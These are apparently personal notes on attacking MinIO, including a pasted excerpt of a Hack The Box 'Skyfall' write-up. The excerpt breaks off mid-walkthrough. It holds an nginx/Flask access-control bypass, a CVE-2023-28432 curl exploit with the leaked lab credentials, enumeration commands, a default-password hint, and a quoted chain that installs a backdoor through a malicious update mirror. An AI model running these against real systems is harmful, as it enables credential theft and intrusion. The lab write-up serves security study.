# minIO


## Install minIO Client

wget https://dl.min.io/client/mc/release/linux-amd64/mc
chmod +x mc
sudo mv mc /usr/local/bin/
mc --help

## Enumerate MinIO with curl.

Is there a cluster? If there is you the response code will be 200. The curl must be a post like this:

url -i http://example.com:54321/minio/health/cluster                                

If there is a cluster it may be vulnerable to CVE-2023-28432 Minio Information Disclosure Vulnerability: https://www.sentinelone.com/blog/cve-2023-28432/

Here is an example of enumerating CVE-2023-28432 vulnerable endpoint and its output: https://0xdf.gitlab.io/2024/08/31/htb-skyfall.html#cve-2023-28432

SSH
Shell as root
￼
Skyfall is all about enumerating technolories like MinIO and Vault. I’ll start with a demo website that has a MinIO status page blocked by nginx. I’ll abuse a parser breakdown between nginx and flask to get access to the page, and learn the MinIO domain. From there, I’ll exploit a vulnerability in MinIO that leaks the admin username and password. With access to the MinIO cluster, I’ll find a home directory backup where a previous version contained a sensitive Vault token in the Bash configuration file. I’ll use that to get access to the Vault instance and SSH access. From there, I’ll have the ability to run a script the unseal the Vault as root. This generates a log file that I can’t read. I’ll abuse FUSE to generate an in-memory filesystem that allows for root to write to it but that I can still read.

Box Info
￼
Skyfall
INSANE
RELEASE DATE
03 Feb 2024
RETIRE DATE
31 Aug 2024
OS
￼
Linux
RATED DIFFICULTY
￼
RADAR GRAPH
￼
USER
05:17:50
￼
ROOT
05:57:45
￼
CREATORS
￼
￼
Recon
nmap
nmap finds two open TCP ports, SSH (22) and HTTP (80):

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.254
Starting Nmap 7.80 ( https://nmap.org ) at 2024-08-23 16:54 EDT
Nmap scan report for 10.10.11.254
Host is up (0.085s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.68 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.254
Starting Nmap 7.80 ( https://nmap.org ) at 2024-08-23 16:55 EDT
Nmap scan report for 10.10.11.254
Host is up (0.085s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Skyfall - Introducing Sky Storage!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.79 seconds
Based on the OpenSSH version, the host is likely running Ubuntu 22.04 jammy.

Website - TCP 80
Site
The site is for a data management company:

￼￼
Most of the links on the page go to other places on the page. There is one in the middle that goes to demo.skyfall.htb. There are also some names / emails:

James Bond (CEO) - jbond@skyfall.htb
Aurora Skyy (Lead Developer) - askyy@skyfall.htb
Bill Tanner (CTO) - btanner@skyfall.htb
contact@skyfall.com
There’s a contact us form at the bottom, but it doesn’t seem to actually do anything.

Tech Stack
The HTTP response headers don’t give much information beyond the nginx version:

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 23 Aug 2024 20:58:47 GMT
Content-Type: text/html
Last-Modified: Thu, 09 Nov 2023 20:44:23 GMT
Connection: keep-alive
ETag: W/"654d44a7-5097"
Content-Length: 20631
The main page loads as index.html, suggesting a static site. The 404 page is the default nginx page.

I’ll note that it’s nginx 1.18.0.

Directory Brute Force
I’ll run feroxbuster against the site, and include -x html:

oxdf@hacky$ feroxbuster -u http://10.10.11.254 -x html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.4
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.254
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.4
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      501l     1612w    20631c http://10.10.11.254/
301      GET        7l       12w      178c http://10.10.11.254/assets => http://10.10.11.254/assets/
301      GET        7l       12w      178c http://10.10.11.254/assets/js => http://10.10.11.254/assets/js/
301      GET        7l       12w      178c http://10.10.11.254/assets/css => http://10.10.11.254/assets/css/
301      GET        7l       12w      178c http://10.10.11.254/assets/img => http://10.10.11.254/assets/img/
200      GET      501l     1612w    20631c http://10.10.11.254/index.html
301      GET        7l       12w      178c http://10.10.11.254/assets/img/clients => http://10.10.11.254/assets/img/clients/
301      GET        7l       12w      178c http://10.10.11.254/assets/img/portfolio => http://10.10.11.254/assets/img/portfolio/
301      GET        7l       12w      178c http://10.10.11.254/assets/img/team => http://10.10.11.254/assets/img/team/
301      GET        7l       12w      178c http://10.10.11.254/assets/vendor => http://10.10.11.254/assets/vendor/
301      GET        7l       12w      178c http://10.10.11.254/assets/vendor/aos => http://10.10.11.254/assets/vendor/aos/
[####################] - 3m    300000/300000  0s      found:11      errors:0
[####################] - 3m    300000/300000  0s      found:11      errors:0
[####################] - 2m     30000/30000   291/s   http://10.10.11.254/
[####################] - 2m     30000/30000   292/s   http://10.10.11.254/assets/
[####################] - 2m     30000/30000   292/s   http://10.10.11.254/assets/js/
[####################] - 2m     30000/30000   292/s   http://10.10.11.254/assets/css/
[####################] - 2m     30000/30000   292/s   http://10.10.11.254/assets/img/
[####################] - 2m     30000/30000   292/s   http://10.10.11.254/assets/img/clients/
[####################] - 2m     30000/30000   292/s   http://10.10.11.254/assets/img/portfolio/
[####################] - 2m     30000/30000   292/s   http://10.10.11.254/assets/img/team/
[####################] - 2m     30000/30000   292/s   http://10.10.11.254/assets/vendor/
[####################] - 2m     30000/30000   291/s   http://10.10.11.254/assets/vendor/aos/ 
￼
Nothing interesting.

Subdomain Brute Force
Given the use of the domains skyfall.htb and demo.skyfall.htb, I’ll brute force with ffuf to see if any other subdomains respond differently:

oxdf@hacky$ ffuf -u http://10.10.11.254 -H "Host: FUZZ.skyfall.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.254
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.skyfall.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

demo                    [Status: 302, Size: 217, Words: 23, Lines: 1, Duration: 151ms]
:: Progress: [19966/19966] :: Job [1/1] :: 458 req/sec :: Duration: [0:00:43] :: Errors: 0 ::
Only demo. I’ll add both to my /etc/hosts file:

10.10.11.254 skyfall.htb demo.skyfall.htb
demo.skyfall.htb - TCP 80
Site
The site presents a login page:

￼
Being a demo site, there’s a note that the creds guest / guest should work, and they do:

￼
There are a lot of features on this page. The Dashboard page above (/index) doesn’t have anything useful.

The “Files” page (/files) has a single file, and an option to upload more:

￼
The PDF describes the service, but nothing too interesting. I can upload a file:

￼
The Beta Features page (/beta) returns a not authorized message:

￼
The URL Fetch page (/fetch) offers a form to upload a file from a URL:

￼
If I give it a URL of my IP, it will hit it:

10.10.11.254 - - [23/Aug/2024 17:26:37] code 404, message File not found
10.10.11.254 - - [23/Aug/2024 17:26:37] "GET /test.png HTTP/1.1" 404 -
If I give it a URL to a file that exists, that file shows up on the Files page.

The MinIO Metrics page (/metrics) page returns an nginx 403 Forbidden.

The Feedback page (/feedback) offers a form:

￼
Submitting sends the content in a POST to /feedback, but there’s no indication that anything happens.

The Escalate page (/escalate) has another form:

￼
Submitting this shows a message that it’ll be at least 24 hours before they look:

￼
That sounds like it’s not worth pursing in a CTF.

Tech Stack
The site has a footer saying that it runs on the Python web framework, Flask:

￼
The HTTP headers don’t show anything else. There’s a custom 404 page:

￼
If I use nc to catch one of the incoming web requests from the URL Fetch page, it shows Python Requests, which fits the idea that this is Flask:

GET /htb.png HTTP/1.1
Host: 10.10.14.6
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
The MinIO reference suggests that the system is using MinIO for storage. MinIO is an enterprise storage object store, compatible with S3.

Directory Brute Force
feroxbuster doesn’t find anything that I haven’t come across already:

oxdf@hacky$ feroxbuster -u http://demo.skyfall.htb
                                                                                                          
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.4
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://demo.skyfall.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.4
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        1l       35w      352c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        1l       23w      217c http://demo.skyfall.htb/ => http://demo.skyfall.htb/login
302      GET        1l       23w      217c http://demo.skyfall.htb/logout => http://demo.skyfall.htb/login
200      GET        9l      234w     3674c http://demo.skyfall.htb/login
403      GET        7l       10w      162c http://demo.skyfall.htb/metrics
[####################] - 4m     30000/30000   0s      found:4       errors:0
[####################] - 4m     30000/30000   129/s   http://demo.skyfall.htb/ 
￼
Shell as askyy
Find MinIO Domain
Identify Parsing Issue
The difference between block on /beta and on /metrics is worth thinking about:

Site	HTTP Resp Code	Content
/beta	200 OK	Custom Restricted Page
/metrics	403 Forbidden	nginx 403 Page
Thinking about this and researching leads to a nice post from Rafa’s Blog, Exploiting HTTP Parsers Inconsistencies. It talks about an nginx config that looks like this:

location = /admin {
    deny all;
}

location = /admin/ {
    deny all;
}
And looks at how different applications (including Flask) differ in how they handle parsing URLs. The issue is in how nginx and Flask normalize URLs. There are characters that nginx does not strip from the URL but that Flask does, such as \x85. If I send /admin\x85 in the example above, nginx sees it does not match /admin or /admin/, and passes the request on to Flask. But Flask strips the \x85 and then resolves it as /admin, unblocked! There are nice summary tables showing different versions of nginx and what characters make a bypass for many different application servers. The Flask on is:

￼
To dig in a bit deeper on this, flask is calling strip on the URL, and as this StackOverflow answer explains really nicely, that by default removes the exact list of characters from version 1.20.2 and before.

Bypass
Given that Skyfall is nginx 1.18.0, there are lots of options. These are all unusual non-ASCII characters, so it’s a bit tricky to get them into the path. The best method I found was in Burp Repeater. I’ll add a character I can see (“X”) to the end of the path:

￼
And then switch to the “Hex” tab and edit it from “58” to “85”:

￼
Unfortunately, it doesn’t work. I think this is because the stack is not nginx –> Flask, but nginx –> gunicorn –> Flask, and gunicorn may be performing additional normalization.

I’ll try the others on the list, and 0x0c and 0x0b work:

￼
0x09 (tab) and 0x0a (newline) both work as well here.

There is a ton of data here, but there two interesting ones are minio_software_version_info which shows “version: 2023-03-13T19:46:17Z” and the minio_endpoint_url which is http://prd23-s3-backend.skyfall.htb/minio/v2/metrics/cluster.

I’ll add that to my hosts file:

10.10.11.254 skyfall.htb demo.skyfall.htb prd23-s3-backend.skyfall.htb
Visiting the URL gives information about the MinIO cluster:

￼
Alternative Bypass
Interestingly, visiting /metrics%0a also works. It’s not super clear to me why Flask (or something else on the server) is decoding %0a but not others like %0C, but it does:

￼
Find Vault
CVE Analysis
Searching for vulnerabilities in this version of MinIO, the first result is from MinIO talking about CVE-2023-28432 and CVE-2023-28434:

￼
The advisory for CVE-2023-28432 say it is:

In a cluster deployment, MinIO returns all environment variables, including MINIO_SECRET_KEY and MINIO_ROOT_PASSWORD, resulting in information disclosure.

That seems simple enough. Dump all the environment variables. And it say there’s are no work arounds.

The advisory for CVE-2023-28434 say it is:

An attacker can use crafted requests to bypass metadata bucket name checking and put an object into any bucket while processing PostPolicyBucket. To carry out this attack, the attacker requires credentials with arn:aws:s3:::* permission, as well as enabled Console API access.

This one can be prevented by setting MINIO_BROWSER=off.

The MinIO post links to a post from Security Joes, New Attack Vector In The Cloud: Attackers caught exploiting Object Storage Services, that goes into great detail about real world attacks they were seeing.

All the steps required to achieve code execution in a vulnerable MinIO instance are described below:

1. POST request to endpoint /minio/bootstrap/v1/verify to expose the credentials of the admin account.

2. Attacker configures a MinIO client to interact with the vulnerable instance using the credentials gotten in Step 1. For this, the following command lines are required:

mc alias set [ALIAS] [URL_TARGET_MINIO] [ACCESS_KEY] [SECRET_KEY]
mc alias list
3. Attackers trigger the update process on the compromised MinIO instance, pointing to a malicious payload hosted on a remote server. For this, the following command is executed.

mc admin update [ALIAS] [MIRROR_URL] --yes
4. “Evil” MinIO is installed, now containing a global backdoor that allows the attacker to execute commands on the host.

Step 1 is CVE-2023-28432.

CVE-2023-28432
There’s a Python POC exploit (published over a year before Skyfall’s release), but I don’t need to run it. All it does is make a POST request to /minio/bootstrap/v1/verify on the instance:

oxdf@hacky$ curl -X POST http://prd23-s3-backend.skyfall.htb/minio/bootstrap/v1/verify
{"MinioEndpoints":[{"Legacy":false,"SetCount":1,"DrivesPerSet":4,"Endpoints":[{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node1:9000","Path":"/data1","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":true},{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node2:9000","Path":"/data1","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":false},{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node1:9000","Path":"/data2","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":true},{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node2:9000","Path":"/data2","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":false}],"CmdLine":"http://minio-node{1...2}/data{1...2}","Platform":"OS: linux | Arch: amd64"}],"MinioEnv":{"MINIO_ACCESS_KEY_FILE":"access_key","MINIO_BROWSER":"off","MINIO_CONFIG_ENV_FILE":"config.env","MINIO_KMS_SECRET_KEY_FILE":"kms_master_key","MINIO_PROMETHEUS_AUTH_TYPE":"public","MINIO_ROOT_PASSWORD":"GkpjkmiVmpFuL2d3oRx0","MINIO_ROOT_PASSWORD_FILE":"secret_key","MINIO_ROOT_USER":"5GrE1B2YGGyZzNHZaIww","MINIO_ROOT_USER_FILE":"access_key","MINIO_SECRET_KEY_FILE":"secret_key","MINIO_UPDATE":"off","MINIO_UPDATE_MINISIGN_PUBKEY":"RWTx5Zr1tiHQLwG9keckT0c45M3AGeHD6IvimQHpyRywVWGbP1aVSGav"}}
oxdf@hacky$ curl -X POST http://prd23-s3-backend.skyfall.htb/minio/bootstrap/v1/verify -s | jq .


## Enumerate MinIO site using the official MinIO Client (mc), which acts as a powerful command-line interface for interacting with S3-compatible storage. Enumeration typically involves identifying available buckets and then listing the objects within them. 

1. Configuration & Initial Discovery
First, you must set up an alias for the target MinIO server to communicate with it. 

Configure Alias: Run the following command to link the target site to a local name (e.g., myminio).
bash
mc alias set myminio http://<TARGET_IP>:9000 ACCESS_KEY SECRET_KEY
Use code with caution.

Note: Default credentials for MinIO are often minioadmin:minioadmin.
Identify Server Status: Check the health and version of the server.
bash
mc admin info myminio
Use code with caution.

 
2. Enumerating Buckets and Objects 
Once connected, you can list the structural components of the site.
List All Buckets: This provides a top-level view of available data containers.
bash
mc ls myminio
Use code with caution.

Recursive Enumeration: To see every file and folder across the entire site, use the recursive flag.
bash
mc ls --recursive myminio
Use code with caution.

Tree View: For a more visual representation of the folder hierarchy, use the tree command.
bash
mc tree --files myminio
Use code with caution.

 
3. Advanced Search & Filtering 
If you are looking for specific types of data or metadata:
Search for Specific Files: Use the find command to filter by name or extension.
bash
mc find myminio --name "*.sql"
Use code with caution.

Check Disk Usage: Summarise the size and quantity of objects to identify high-value targets.
bash
mc du myminio
Use code with caution.

 
4. Vulnerability & Security Probing 
If you are performing a security assessment:
Anonymous Access: Check if buckets are publicly accessible without authentication by attempting to list them without a configured alias or using the mc anonymous command.
Known Vulnerabilities: Some older versions of MinIO (pre-2023) are susceptible to Information Disclosure vulnerabilities like CVE-2023-28432, which could allow an attacker to retrieve sensitive system configuration. 
